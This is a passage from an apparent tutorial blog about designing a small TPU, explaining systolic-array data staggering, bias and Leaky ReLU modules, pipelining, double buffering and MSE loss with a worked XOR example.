2}, \quad \mathbf{b}_2 = \begin{bmatrix} \phantom{-}0.6358 \end{bmatrix} \in \mathbb{R}^{1 \times 1}</annotation></semantics></math></span></span></span></p></div></div><h3>Input and weight scheduling</h3><p>To input our input batch within the systolic array, we need to:</p><ul><li>Rotate our X matrix by 90 degrees</li><br><figure><p><img alt="Rotate X matrix by 90 degrees" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/rotate.svg"></p><figcaption>Matrix rotation by 90 degrees to prepare for systolic array input</figcaption></figure><br><li>STAGGER the inputs (delay each row by 1 clock cycle)<sup><a href="#fn4" id="fn4-ref">[4]</a></sup></li><figure><p><img alt="Stagger input matrix" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/stagger-x.svg"></p><figcaption>Input matrix staggering pattern for systolic array processing</figcaption></figure><br></ul><p>To input our weight matrix: we need to:</p><ul><li>Stagger the weight matrix (similar to the inputs)</li><figure><p><img alt="Stagger weight matrix" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/stagger-w.svg"></p><figcaption>Weight matrix staggering pattern for systolic array processing</figcaption></figure><li>Transpose it!</li><figure><p><img alt="Matrix transposition" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/transpose.svg"></p><figcaption>Weight matrix transposition for correct mathematical alignment</figcaption></figure></ul><p>Note that the rotating and staggering don't have any mathematical significance — they are simply required to make the systolic array work. The transpoing too is just for mathematical bookkeeping – it's required to make the matrix math work because of how we set up our weight pointers within the neural network drawing.</p><h3>Staggering and FIFOs</h3><p>To perform the staggering, we designed near-identical accumulators for the weights and inputs that would sit above and to the left of the systolic array, respectively.</p><p>Since the activations are fed into the systolic array one-by-one, we thought a first-in-first-out queue (FIFO) would be the optimal data storage option. There was a slight difference between a traditional FIFO and the accumulators we built, however. Our accumulators had 2 input ports — one for writing weights manually to the FIFO and one for writing the previous layer's outputs from the activation modules BACK into the input FIFOs (the previous layer's outputs are inputs for the current layer).</p><p>We also needed to load the weights in a similar fashion for every layer, so we replicated the logic for the weight FIFOs, without the second port.</p><div><h3>Systolic array matrix multiplication</h3><p><span>clk <!-- -->0</span></p></div><h3>Bias and activation</h3><p>The next step in the equation is adding the bias. To do this in hardware, we need to create a bias module under each column of the systolic array. We can see that as the sums move out of the last row within the systolic array, we can immediately stream them into our bias modules to compute our pre-activations.<b> We will denote these values with the variable Z.</b></p><div><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold">Z</mi><mtext>biased</mtext></msub><mo>=</mo><mi mathvariant="bold">Z</mi><mo>+</mo><mi mathvariant="bold">b</mi></mrow><annotation encoding="application/x-tex">\mathbf{Z}_{\text{biased}} = \mathbf{Z} + \mathbf{b}</annotation></semantics></math></span></span></span></p></div><p>The bias vector <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">b</mi></mrow><annotation encoding="application/x-tex">\mathbf{b}</annotation></semantics></math></span></span></span> is broadcast across all rows of the matrix — meaning it's added to each row of <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">Z</mi></mrow><annotation encoding="application/x-tex">\mathbf{Z}</annotation></semantics></math></span></span></span></p></div><p>Now our equation is starting to look a lot like what we've learned in high school –but just in multidimensional form, where each column that streams out of the systolic array represents its own feature!</p><p>Next we have to apply the activation, for which we chose Leaky ReLU.<sup><a href="#fn5" id="fn5-ref">[5]</a></sup> <!-- -->This is also an element-wise operation, similar to the bias, meaning we need an activation module under every bias module (and by proxy under every column of the systolic array) and we can stream the outputs of our bias modules into the activation modules immediately.<b>We will denote these post-activation values with H</b>.</p><div><p>The Leaky ReLU function applies element-wise:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mtext>LeakyReLU</mtext><mi>α</mi></msub><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>z</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>z</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>α</mi><mo>⋅</mo><mi>z</mi></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>z</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\text{LeakyReLU}_\alpha(z) = \begin{cases} z &amp; \text{if } z &gt; 0 \\[0.3em] \alpha \cdot z &amp; \text{if } z \leq 0 \end{cases}</annotation></semantics></math></span></span></span></p></div><p>where <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>α</mi><mo>=</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">\alpha = 0.5</annotation></semantics></math></span></span></span> is our leak factor. For matrices, this applies to each element independently.</p></div><div><p>For our XOR example, let's see how Layer 1 processes the data. First, the systolic array computes<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">X</mi><msubsup><mi mathvariant="bold">W</mi><mn>1</mn><mi>T</mi></msubsup></mrow><annotation encoding="application/x-tex">\mathbf{X}\mathbf{W}_1^T</annotation></semantics></math></span></span></span>:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>0</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>0</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>0</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>1</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>1</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>0</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>1</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>1</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2985</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0913</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.5792</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.4234</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0000</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0000</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.5792</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.4234</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2985</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0913</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.2807</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5147</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{Z}_1 = \begin{bmatrix} \phantom{.}0\phantom{.} &amp; \phantom{.}0\phantom{.} \\[0.2em] \phantom{.}0\phantom{.} &amp; \phantom{.}1\phantom{.} \\[0.2em] \phantom{.}1\phantom{.} &amp; \phantom{.}0\phantom{.} \\[0.2em] \phantom{.}1\phantom{.} &amp; \phantom{.}1\phantom{.} \end{bmatrix} \begin{bmatrix} \phantom{-}0.2985 &amp; \phantom{-}0.0913 \\[0.2em] -0.5792 &amp; \phantom{-}0.4234 \end{bmatrix} = \begin{bmatrix} \phantom{-}0.0000 &amp; \phantom{-}0.0000 \\[0.2em] -0.5792 &amp; \phantom{-}0.4234 \\[0.2em] \phantom{-}0.2985 &amp; \phantom{-}0.0913 \\[0.2em] -0.2807 &amp; \phantom{-}0.5147 \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>Then bias is added:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub><mo>=</mo><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub><mo>+</mo><msub><mi mathvariant="bold">b</mi><mn>1</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.4939</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.1890</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1.0731</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6124</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.1954</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2803</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.7746</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.7037</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{Z}_1 = \mathbf{Z}_1 + \mathbf{b}_1 = \begin{bmatrix} -0.4939 &amp; \phantom{-}0.1890 \\[0.2em] -1.0731 &amp; \phantom{-}0.6124 \\[0.2em] -0.1954 &amp; \phantom{-}0.2803 \\[0.2em] -0.7746 &amp; \phantom{-}0.7037 \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>Finally, LeakyReLU is applied element-wise:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold">H</mi><mn>1</mn></msub><mo>=</mo><msub><mtext>LeakyReLU</mtext><mn>0.5</mn></msub><mo stretchy="false">(</mo><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.2470</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.1890</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.5366</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6124</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0977</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2803</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.3873</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.7037</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{H}_1 = \text{LeakyReLU}_{0.5}(\mathbf{Z}_1) = \begin{bmatrix} -0.2470 &amp; \phantom{-}0.1890 \\[0.2em] -0.5366 &amp; \phantom{-}0.6124 \\[0.2em] -0.0977 &amp; \phantom{-}0.2803 \\[0.2em] -0.3873 &amp; \phantom{-}0.7037 \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>Negative values are multiplied by 0.5, positive values pass through unchanged.</p></div><div><h3>Systolic array with bias and leaky ReLU</h3><p><span>clk <!-- -->0</span></p></div><h3>Pipelining</h3><p>Now you might be asking – why don't we merge the bias term and the activation term in one clock cycle? Well, this is because of something called pipelining! Pipelining allows multiple operations to be executed simultaneously across different stages of the TPU —instead of waiting for one complete operation to finish before starting the next, you break the work into stages that can overlap. Think of it like an assembly line: while one worker (activation module) processes a part, the previous worker (bias module) is already working on the next part. This keeps all of the modules busy rather than having them sit idle waiting for the previous stage to complete. It also affects the speed at which we can run our TPU — if we have one module that tries to squeeze many operations in a single cycle, our clock speed will be bottlenecked by that module, as the other modules can only run as fast as that single module. Therefore, it's efficient and best practice to split up operations into individual clock cycles as much as possible.</p><figure><p><img alt="Pipeline diagram" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/pipelining.svg"></p><figcaption>Pipelining stages showing how operations overlap across clock cycles</figcaption></figure><p>Another mechanism we used to run our chip as efficiently as possible, was a propagating "start" signal, which we called a travelling chip enable (denoted by the purple dot). Because everything in our design was staggered, we realized that we could very elegantly assert a start signal for a single clock cycle at the first accumulator and have it propagate to neighbouring modules exactly when they needed to be turned on.</p><p>This would extend into the systolic array and eventually the bias and activation modules, where neighbouring PEs and modules, moving from the top left to the bottom right, were turned on in consecutive clock cycles. This ensured that every module was only performing computations when it was required to and wasn't wasting power in the background.</p><h3>Double buffering</h3><p>Now, we know that starting a new layer means we must compute the same <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">X</mi><msup><mi mathvariant="bold">W</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\mathbf{X}\mathbf{W}^T</annotation></semantics></math></span></span></span> using a new weight matrix. How can we do this if our systolic array is weight-stationary? How can we change the weights?</p><p>While thinking about this problem, we came across the idea of double buffering, which originates from video games. The reason why double buffering exists is to prevent something called screen tearing on your monitor. Ultimately, pixels take time to load and we'd like to "hide away" that time somehow. And if you paid attention, this is the exact same problem we're currently facing with the systolic array. Fortunately, video game designers have already come up with a solution for this problem. By adding a second "shadow" buffer, which holds the weights of the next layer while the current layer is being computed on, we can load in new weights during computation, cutting the total clock cycle count in half.</p><p>To make this work, we also needed to add some signals to move the data. First, we needed a signal to indicate when to switch the weights in the shadow buffer and the active buffer. We called this signal the "switch" signal (denoted by the blue dot) and it copied the values in the shadow buffer to the active buffer. It propagated from the top left of the systolic array to the bottom right (the same path as the travelling chip enable, but only within the systolic array). We then needed one more signal to indicate when we wanted to move the weights down by one row and we called this the "accept" flag (denoted by the green dot) because each row is ACCEPTING a new set of weights. This would move the new weights into the top row of the systolic array, as well as each row of weights down into the next row of the systolic array. These two control flags worked in tandem to make our double buffering mechanism work.</p><p>If you haven't already noticed, this allows the systolic array to do something powerful…continuous inference!!! We can continuously stream in new weights and inputs and compute forward pass for as many layers as we want. This touches into a core design philosophy of the systolic array: we want to maximize PE usage. We always want to keep the systolic array fed!</p><div><p>For Layer 2, the outputs from Layer 1 (<span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold">H</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{H}_1</annotation></semantics></math></span></span></span>) now become our inputs:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold">z</mi><mn>2</mn></msub><mo>=</mo><msub><mi mathvariant="bold">H</mi><mn>1</mn></msub><msubsup><mi mathvariant="bold">W</mi><mn>2</mn><mi>T</mi></msubsup><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.2470</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.1890</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.5366</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6124</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0977</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2803</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.3873</mn></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.7037</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5266</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2958</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0741</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.1014</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0315</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0042</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{z}_2 = \mathbf{H}_1\mathbf{W}_2^T = \begin{bmatrix} -0.2470 &amp; \phantom{-}0.1890 \\[0.2em] -0.5366 &amp; \phantom{-}0.6124 \\[0.2em] -0.0977 &amp; \phantom{-}0.2803 \\[0.2em] -0.3873 &amp; \phantom{-}0.7037 \end{bmatrix} \begin{bmatrix} \phantom{-}0.5266 \\[0.2em] \phantom{-}0.2958 \end{bmatrix} = \begin{bmatrix} -0.0741 \\[0.2em] -0.1014 \\[0.2em] \phantom{-}0.0315 \\[0.2em] \phantom{-}0.0042 \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>Adding bias and applying activation:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi mathvariant="bold">z</mi><mn>2</mn></msub><mo>=</mo><msub><mi mathvariant="bold">z</mi><mn>2</mn></msub><mo>+</mo><msub><mi mathvariant="bold">b</mi><mn>2</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5617</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5344</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6673</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6400</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\mathbf{z}_2 = \mathbf{z}_2 + \mathbf{b}_2 = \begin{bmatrix} \phantom{-}0.5617 \\[0.2em] \phantom{-}0.5344 \\[0.2em] \phantom{-}0.6673 \\[0.2em] \phantom{-}0.6400 \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mover accent="true"><mi mathvariant="bold">y</mi><mo>^</mo></mover><mo>=</mo><msub><mi mathvariant="bold">h</mi><mn>2</mn></msub><mo>=</mo><msub><mtext>LeakyReLU</mtext><mn>0.5</mn></msub><mo stretchy="false">(</mo><msub><mi mathvariant="bold">z</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5617</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5344</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6673</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.6400</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\hat{\mathbf{y}} = \mathbf{h}_2 = \text{LeakyReLU}_{0.5}(\mathbf{z}_2) = \begin{bmatrix} \phantom{-}0.5617 \\[0.2em] \phantom{-}0.5344 \\[0.2em] \phantom{-}0.6673 \\[0.2em] \phantom{-}0.6400 \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>All values are positive, so they pass through unchanged. These are our final predictions for the XOR problem!</p><div><h3>Forward pass walkthrough (with double buffering)</h3><p><span>clk <!-- -->0</span></p></div></div><h3>Control unit and ISA</h3><p>Our final step for inference was making a control unit to use a custom instruction set (ISA) to assert all of our control flags and load data through a data bus. Including the data bus, our ISA was 24 bits long and it made our testbench more elegant as we could pass a single string of bits every clock cycle, rather than individually setting multiple flags.</p><p>We then put everything together and got inference completely working! This was a big milestone for us and we were very proud about what we had accomplished.</p><h2>Backpropagation and training</h2><div><p>Ok we've solved inference — but what about training? Well here's the beauty: We can use the same architecture we use for inference for training! Why? Because training is just matrix multiplications with a few extra steps.</p><p>Here's where things get really exciting. Let's say we just ran inference on the XOR problem and got a prediction that looks something like [0.8, 0.3, 0.1, 0.9] when we actually wanted [1, 0, 0, 1]. Our model is performing poorly! We need to make it better. This is where training comes in. We're going to use something called a loss function to tell our model exactly how poorly it's doing. For simplicity, we chose Mean Squared Error (MSE) — think of it like measuring the "distance" between what we predicted and what we actually wanted, just like how you might measure how far off target your basketball shot was.<!-- --> <b>Let's denote the loss with L.</b></p><div><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="script">L</mi><mo>=</mo><mfrac><mn>1</mn><mi>N</mi></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>N</mi></munderover><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo>−</mo><msub><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>i</mi></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\mathcal{L} = \frac{1}{N}\sum_{i=1}^{N}(y_i - \hat{y}_i)^2</annotation></semantics></math></span></span></span></p></div><p>where <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>y</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">y_i</annotation></semantics></math></span></span></span> is the target output,<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>y</mi><mo>^</mo></mover><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\hat{y}_i</annotation></semantics></math></span></span></span> is our prediction, and<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span></span> is the number of samples</p></div><div><p>For our XOR example, with predictions<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi mathvariant="bold">y</mi><mo>^</mo></mover><mo>=</mo><mo stretchy="false">[</mo><mn>0.5617</mn><mo separator="true">,</mo><mn>0.5344</mn><mo separator="true">,</mo><mn>0.6673</mn><mo separator="true">,</mo><mn>0.6400</mn><msup><mo stretchy="false">]</mo><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\hat{\mathbf{y}} = [0.5617, 0.5344, 0.6673, 0.6400]^T</annotation></semantics></math></span></span></span> <!-- -->and targets <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">y</mi><mo>=</mo><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo separator="true">,</mo><mn>0</mn><msup><mo stretchy="false">]</mo><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\mathbf{y} = [0, 1, 1, 0]^T</annotation></semantics></math></span></span></span>:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="script">L</mi><mo>=</mo><mfrac><mn>1</mn><mn>4</mn></mfrac><mo stretchy="false">[</mo><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>0.5617</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mn>0.5344</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mn>0.6673</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo>+</mo><mo stretchy="false">(</mo><mn>0</mn><mo>−</mo><mn>0.6400</mn><msup><mo stretchy="false">)</mo><mn>2</mn></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">\mathcal{L} = \frac{1}{4}[(0 - 0.5617)^2 + (1 - 0.5344)^2 + (1 - 0.6673)^2 + (0 - 0.6400)^2]</annotation></semantics></math></span></span></span></p></div><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="script">L</mi><mo>=</mo><mfrac><mn>1</mn><mn>4</mn></mfrac><mo stretchy="false">[</mo><mn>0.3155</mn><mo>+</mo><mn>0.2168</mn><mo>+</mo><mn>0.1107</mn><mo>+</mo><mn>0.4096</mn><mo 